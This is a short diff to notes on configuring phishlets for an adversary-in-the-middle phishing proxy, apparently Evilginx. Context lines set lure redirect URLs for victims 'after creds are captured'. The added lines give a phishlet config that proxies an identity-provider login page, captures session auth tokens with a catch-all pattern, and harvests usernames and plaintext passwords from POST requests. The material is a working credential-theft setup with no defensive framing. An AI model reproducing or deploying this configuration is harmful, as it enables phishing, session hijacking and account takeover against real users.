@@ -25,3 +25,15 @@ For NEW Phishlets do this
     https://mo-idp.j0n.cc/mo
    lures edit 3 redirect_url https://sub.actualdomain.com   << where user is directed after creds are captured
 7. config redirect_url https://actualdomain.com
+
+
+
+Notes:
+author: 'sny7er' min_ver: '2.3.0' proxy_hosts:
+
+{phish_sub: 'application', orig_sub: 'mo-idp', domain: 'domain.com', session: true, is_landing: true, auto_filter: true}
+auth_tokens:
+
+domain: 'application.domain.com' keys: ['.*,regexp'] auth_urls:
+'/enduserwelcome' credentials: username: key: 'username' search: '(.)' type: 'post' password: key: 'plaintextPassword' search: '(.)' type: 'post'
+login: domain: 'application.domain.com' path: '/login'
